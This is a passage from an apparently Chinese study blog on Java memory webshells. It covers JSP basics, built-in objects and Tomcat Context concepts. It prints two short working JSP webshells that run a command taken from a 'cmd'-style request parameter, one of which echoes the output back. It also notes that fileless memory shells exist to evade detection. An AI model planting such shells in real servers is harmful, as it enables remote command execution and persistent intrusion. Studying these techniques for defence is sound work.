很早之前就听说过python内存马，但也是粗略的学习，到java内存马，从基础一点一点学起
# jsp基础
个人觉得，其实jsp就是html和java代码的混合体，就是把html中的java代码抠出来然后把他编译成一个java文件，并把它编译成.class文件，然后返回完整的html，动态地创建网页
举个形象的例子
```jsp
<html>  
<body>  
<h2>我是html</h2>  
<% out.println("GoodBye!"); %>  
</body>  
</html>
```


其中有几个细节

## 声明
一个声明语句可以声明一个或多个变量、方法，供后面的 Java 代码使用。JSP 声明语句格式如下
```jsp
<%! 声明  %>
```
同样等价于下面的xml语句
```xml
<jsp:declaration>   
代码片段
</jsp:declaration>
```
声明中的变量，是类的 **成员变量/方法**，在当前页面（作用域）任何 `<%%>`中的java代码都共用这个变量，随着 Servlet 实例的创建而创建，直到 Servlet 销毁。
而 `<%%>`中的变量类似 **局部变量**作用域仅限当前代码块。

## jsp表达式
```jsp
<%= 表达式 %>
```
等价于
```xml
<jsp:expression>   
	表达式
</jsp:expression>
```

```jsp
<html>
<body>
<h2>Hello World!!!</h2>
<p><% String name = "Po1nt"; %>username:<%=name%></p>
</body>
</html>
```
就会输出Po1nt
## jsp指令

JSP指令用来设置与整个JSP页面相关的属性。下面有三种JSP指令
![](picture/Pasted%20image%2020260104214456.png)
比如我们能通过page指令来设置jsp页面的编码格式
```jsp
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
```
回显是一样的，因为 JSP 属于模板引擎

## jsp内置对象
个人理解有点像php的原生类
JSP有九大内置对象，他们能够在客户端和服务器端交互的过程中分别完成不同的功能。其特点如下

- 由 JSP 规范提供，不用编写者实例化
- 通过 Web 容器实现和管理
- 所有 JSP 页面均可使用
-  只有在脚本元素的表达式或代码段中才能使用

|对  象|类型|说  明|
|---|---|---|
|[request](https://drun1baby.top/jsp2/request.html)|javax.servlet.http.HttpServletRequest|获取用户请求信息|
|[response](https://drun1baby.top/jsp2/response.html)|javax.servlet.http.HttpServletResponse|响应客户端请求，并将处理信息返回到客户端|
|[out](https://drun1baby.top/jsp2/out.html)|javax.servlet.jsp.JspWriter|输出内容到 HTML 中|
|[session](https://drun1baby.top/jsp2/session.html)|javax.servlet.http.HttpSession|用来保存用户信息|
|[application](https://drun1baby.top/jsp2/application.html)|javax.servlet.ServletContext|所有用户共享信息|
|[config](https://drun1baby.top/jsp2/config.html)|javax.servlet.ServletConfig|这是一个 Servlet 配置对象，用于 Servlet 和页面的初始化参数|
|[pageContext](https://drun1baby.top/jsp2/pagecontext.html)|javax.servlet.jsp.PageContext|JSP 的页面容器，用于访问 page、request、application 和 session 的属性|
|[page](https://drun1baby.top/jsp2/page_object.html)|javax.servlet.jsp.HttpJspPage|类似于 Java 类的 this 关键字，表示当前 JSP 页面|
|[exception](https://drun1baby.top/jsp2/page.html)|java.lang.Throwable|该对象用于处理 JSP 文件执行时发生的错误和异常；只有在 JSP 页面的 page 指令中指定 isErrorPage 的取值 true 时，才可以在本页面使用 exception 对象。|

# 传统木马

我们先来看一看传统的最简单的 JSP 内存马是什么样子的。
```jsp
<% 
	Runtime.getRuntime().exec(request.getParameter("calc"));
%>
```
ok看着唐完了。。

我们给他加上回显的功能
```jsp
 <% if(request.getParameter("cmd")!=null){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.print(new String(b));
    }
    out.print("</pre>");
}
%>
```
所以为了避免给文件落地，被查杀，有更加隐蔽的内存马，文件不落地

- 利用Java Web组件：动态添加恶意组件，如Servlet、Filter、Listener等。在Spring框架下就是Controller、Intercepter。
- 修改字节码：利用Java的Instrument机制，动态注入Agent，在Java内存中动态修改字节码，在HTTP请求执行路径中的类中添加恶意代码，可以实现根据请求的参数执行任意代码。

# Tomcat中的三个Context的理解
# Context
context是上下文的意思，在java中经常能看到这个东西。那么到底是什么意思呢？
根据yzddmr6师傅的理解，如果把某次请求比作电影中的事件，那么context就相当于事件发生的背景。例如一部电影中的某个镜头中，张三大喊“奥利给”，但是只看这一个镜头我们不知道到底发生了什么，张三是谁，为什么要喊“奥利给”。所以就需要交代当时事情发生的背景。张三是吃饭前喊的奥利给？还是吃饭后喊的奥利给？因为对于同一件事情：张三喊奥利给这件事，发生的背景不同意义可能是不同的。吃饭前喊奥利给可能是饿了的意思，吃饭后喊奥利给可能是说吃饱了的意思。

在WEB请求中也如此，在一次request请求发生时，背景，也就是context会记录当时的情形：当前WEB容器中有几个filter，有什么servlet，有什么listener，请求的参数，请求的路径，有没有什么全局的参数等等。

## ServletContext
简单来说，**`ServletContext` 就是整个 Web 应用的“共享大仓库”和“运行环境上下文”**。

如果把 **Servlet** 比作公司里的**员工**（负责具体干活），那么 **`ServletContext`** 就是**公司的行政部**：
- **全应用共享**：公司里只有一个行政部，所有员工（Servlet）共享同一个行政部。
- **资源中心**：你想查公司的地址（获取路径）、想领公章（获取参数）、想看公司的规章制度（获取 Filter/Servlet 列表），都要去找行政部。
- **信息中转**：员工 A 给行政部留了个话，员工 B 下午去行政部就能听到（数据共享）















